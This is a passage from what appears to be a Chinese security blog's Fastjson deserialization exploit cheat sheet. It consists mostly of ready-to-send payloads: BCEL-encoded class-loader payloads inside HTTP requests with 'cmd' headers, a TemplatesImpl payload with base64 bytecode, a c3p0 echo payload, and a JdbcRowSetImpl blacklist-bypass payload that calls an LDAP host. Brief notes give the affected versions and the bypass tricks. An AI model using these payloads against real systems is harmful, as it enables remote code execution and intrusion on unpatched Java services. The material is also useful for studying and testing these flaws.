$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;x&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Fastjson-1-2-33-1-2-47"><a href="#Fastjson-1-2-33-1-2-47" class="headerlink" title="Fastjson 1.2.33-1.2.47"></a>Fastjson 1.2.33-1.2.47</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs json">POST /json HTTP/<span class="hljs-number">1.1</span><br>Host<span class="hljs-punctuation">:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-punctuation">:</span><span class="hljs-number">9092</span><br>Content-Type<span class="hljs-punctuation">:</span> application/json<br>cmd<span class="hljs-punctuation">:</span> whoami<br>Content-Length<span class="hljs-punctuation">:</span> <span class="hljs-number">3647</span><br><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;xx&quot;</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span>   <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;x&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;val&quot;</span>   <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;xxx&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>1.2.33&lt;&#x3D;fastjson&lt;&#x3D;12.36</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span>   <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;x&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;val&quot;</span>   <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$$BCEL...&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ddd&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>1.2.37&lt;&#x3D;fastjson&lt;&#x3D;1.2.47</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span>   <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;x&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;val&quot;</span>   <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;y&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;@type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$$BCEL$..&quot;</span><span class="hljs-punctuation">,</span><br><br>        <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.x.y.c.connection&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>其他</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;driver&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$xxxxxxx&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>TemplatesImpl</strong></p><p>利用条件苛刻，可用于解决不出网利用。<br>需要调用<code>parseObject()</code>方法时，加入Feature.SupportNonPublicField参数。<br>_bytecodes要进行base64编码</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;_bytecodes&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAkACUBAAZURU1QT0MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACwAEAAwADQANAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFgAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGQAIABoADAAAAAQAAQAUAAEAFQAAAAIAFg==&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;_name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a.b&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;_tfactory&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;_outputProperties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;_version&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;allowedProtocols&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;all&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>c3p0#WrapperConnectionPoolDataSource</strong></p><p>可用于解决不出网利用。<br>fastjson &lt;1.2.47<br>利用c3p0二次反序列化 cc payload到达回显。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json">POST /json HTTP/<span class="hljs-number">1.1</span><br>Host<span class="hljs-punctuation">:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-punctuation">:</span><span class="hljs-number">8999</span><br>Upgrade-Insecure-Requests<span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>User-Agent<span class="hljs-punctuation">:</span> Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML<span class="hljs-punctuation">,</span> like Gecko) Chrome/<span class="hljs-number">75.0</span><span class="hljs-number">.3770</span><span class="hljs-number">.142</span> Safari/<span class="hljs-number">537.36</span><br>Accept<span class="hljs-punctuation">:</span> text/html<span class="hljs-punctuation">,</span>application/xhtml+xml<span class="hljs-punctuation">,</span>application/xml;q=<span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span>image/webp<span class="hljs-punctuation">,</span>image/apng<span class="hljs-punctuation">,</span>*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">cmd: dir</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Content-Type: application/json</span><br><span class="hljs-comment">Content-Length: 8925</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMapquot;&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Fastjson-1-2-25-1-2-41"><a href="#Fastjson-1-2-25-1-2-41" class="headerlink" title="Fastjson 1.2.25-1.2.41"></a>Fastjson 1.2.25-1.2.41</h3><p>1.2.25后将TypeUtils.loadClass替换为checkAutoType()函数，增加了黑名单和白名单。<br>把autoTypeSupport默认为False。<br>当autoTypeSupport为False时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错。<br>当autoTypeSupport为True时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。</p><p>1.2.25黑名单</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs json">bsh<br>com.mchange<br>com.sun.<br>java.lang.Thread<br>java.net.Socket<br>java.rmi<br>javax.xml<br>org.apache.bcel<br>org.apache.commons.beanutils<br>org.apache.commons.collections.Transformer<br>org.apache.commons.collections.functors<br>org.apache.commons.collections4.comparators<br>org.apache.commons.fileupload<br>org.apache.myfaces.context.servlet<br>org.apache.tomcat<br>org.apache.wicket.util<br>org.codehaus.groovy.runtime<br>org.hibernate<br>org.jboss<br>org.mozilla.javascript<br>org.python.core<br>org.springframework<br></code></pre></td></tr></table></figure><p>exp<br>条件需要开启autotype<br>类名前面加了一个L，后面加一个;可以绕过黑名单</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/badNameClass&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Fastjson-1-2-25-1-2-42"><a href="#Fastjson-1-2-25-1-2-42" class="headerlink" title="Fastjson 1.2.25-1.2.42"></a>Fastjson 1.2.25-1.2.42</h3><p>从1.2.42版本开始,把之前的明文黑名单，改为hash黑名单。<br>如下大佬整理的<br><a 